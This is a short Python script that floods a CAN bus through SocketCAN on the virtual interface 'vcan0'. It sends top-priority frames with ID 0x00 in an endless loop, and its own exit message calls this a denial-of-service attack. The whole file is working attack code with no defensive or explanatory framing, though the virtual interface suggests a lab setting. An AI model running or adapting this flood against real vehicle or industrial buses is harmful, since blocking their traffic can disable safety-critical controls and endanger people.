import time
import socket
import struct
import sys
import os

sock = socket.socket(socket.PF_CAN, socket.SOCK_RAW, socket.CAN_RAW) #crating socket
sock.setsockopt(socket.SOL_CAN_RAW, socket.CAN_RAW_ERR_FILTER, socket.CAN_ERR_MASK)#allow socket to receive error frames

interface = "vcan0"

try:
    sock.bind((interface,))

except socket.error as e:
    print(str(e))
    print("\n--------------------------------------------------------------------------------")

can_frame_format = "<LB3xq"
can_msg = struct.pack(can_frame_format,0x00,8,1337)

try:
    while True:
        msg = sock.send(can_msg)

except KeyboardInterrupt:
    print("\n dos attack stoped!")
